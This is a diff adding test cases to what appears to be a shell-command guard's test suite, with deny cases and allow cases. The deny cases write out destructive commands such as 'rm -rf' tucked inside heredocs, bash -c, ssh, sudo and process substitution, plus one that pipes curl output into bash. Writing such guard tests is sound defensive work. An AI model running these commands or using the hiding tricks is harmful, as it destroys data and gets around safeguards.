@@ -135,6 +135,45 @@ It's done: $(rm -rf "$D")
 EOF
 X
 deny "$h4"
+IFS= read -r -d '' h5 <<'X'
+bash -euo pipefail <<'EOF'
+rm -rf "$D"
+EOF
+X
+deny "$h5"
+deny "${h5/bash -euo/ssh host bash -euo}"
+deny "${h5/-euo/-o}"
+deny "${h5/bash -euo pipefail/sudo -i}"
+deny "${h5/bash -euo pipefail/sudo su - build}"
+deny "${h5/bash -euo pipefail/ssh host -T}"
+IFS= read -r -d '' h6 <<'X'
+bash -c "$(cat <<'EOF'
+rm -rf "$D"
+EOF
+)"
+X
+deny "$h6"
+IFS= read -r -d '' h7 <<'X'
+ssh host "$(cat <<'EOF'
+cd /srv && rm -rf cache/*
+EOF
+)"
+X
+deny "$h7"
+deny "cat <<< 'rm -rf \"\$D\"' | bash"
+deny "bash <(echo 'rm -rf \"\$D\"')"
+deny "bash -c \"\$(curl -fsSL https://example.com/x.sh | sed s/rm/rm/)\""
+deny 'base64 -d <<<aGVsbG8=
+rm -rf "$D"'
+deny 'echo $((1 << 3))
+rm -rf "$D"'
+
+# Only the command a word names counts, not a path or an option's value with the same name.
+deny "find ~/.cache/pip -name '*.whl' -exec rm {} \\;"
+deny 'find docker -name x -exec rm {} +'
+deny 'sudo -u git rm -rf "$D"'
+deny "sudo -u git bash -c 'rm -rf \$D'"
+deny 'find . -exec grep -q x {} \; -exec rm {} \;'
 
 # An apostrophe in a heredoc inside "$(...)" doesn't hide what comes after it.
 IFS= read -r -d '' c1 <<'X'
@@ -197,6 +236,18 @@ allow 'find . -exec grep -l "rm" {} +'
 allow 'sudo grep -c "rm -f /tmp" log'
 allow 'gh issue create --title tmux --body "rm -rf the build dir"'
 allow "python3 -c 'rm = 3; print(rm)'"
+allow 'git ls-files -z | xargs -0 grep -n rm'
+allow 'grep -c rm <<< "$log"'
+allow '$(which python3) -c "print(1)" && rm -f /tmp/ok'
+allow 'echo $((1 << 3)) && rm -f /tmp/ok'
+allow 'for ((i = 0; i < 3; i++)); do echo "$i"; done && rm -f /tmp/ok'
+IFS= read -r -d '' p5 <<'X'
+bash -c "$(cat <<'EOF'
+echo 'rm is gone'
+EOF
+)"
+X
+allow "$p5"
 
 # A heredoc no shell reads, with a quoted delimiter, is only text: a commit or PR body, or a file.
 IFS= read -r -d '' p1 <<'X'
